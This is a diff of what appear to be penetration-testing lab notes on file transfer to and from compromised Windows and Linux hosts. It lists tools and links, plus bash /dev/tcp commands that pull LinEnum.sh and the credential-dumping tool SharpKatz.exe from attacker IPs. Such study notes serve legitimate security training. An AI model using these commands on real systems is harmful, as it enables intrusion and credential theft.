@@ -12,11 +12,11 @@ Windows download:
   https://github.com/fortra/impacket/blob/master/examples/smbserver.py
   then copy or mount
 
-
 Windows upload:
   https://github.com/Densaugeo/uploadserver
 
   https://github.com/mar10/wsgidav
+
 
 Linux download:
   wget
@@ -24,3 +24,18 @@ Linux download:
   use pipe to do fileless
   bash exec 3<>/dev/tcp/10.10.10.32/80  echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
   ssh/scp
+
+Linux upload:
+  https://github.com/Densaugeo/uploadserver
+  pyhone or php server
+
+
+netcat=nc, Ncat is by Nmap team
+
+If we don't have Netcat or Ncat on our compromised machine, Bash supports read/write operations on a pseudo-device file /dev/TCP/.
+https://github.com/Densaugeo/uploadserver
+at < /dev/tcp/192.168.49.128/443 > SharpKatz.exe (vice versa)
+
+https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/running-remote-commands?view=powershell-7.6&viewFallbackFrom=powershell-7.2
+
+https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/mstsc
